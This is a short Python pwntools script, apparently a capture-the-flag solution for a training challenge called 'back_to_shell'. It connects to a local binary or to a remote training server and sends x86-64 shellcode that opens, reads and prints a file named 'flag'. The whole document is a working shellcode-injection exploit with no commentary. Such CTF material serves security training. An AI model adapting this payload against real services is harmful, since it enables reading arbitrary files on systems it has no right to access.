from pwn import *

context.arch = "amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./back_to_shell")
        gdb.attach(c, """
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./back_to_shell")

shellcode = """
    mov rdx, 0x0067616c66
    mov rax, 2
    push rdx
    mov rdi, rsp
    xor rdx, rdx
    syscall
    mov rdi, rax
    xor eax, eax
    mov rdx, 70
    mov rsi, rsp
    syscall
    mov rax, 1
    mov rdi, 1
    syscall
"""

c.sendline(asm(shellcode))

c.interactive()
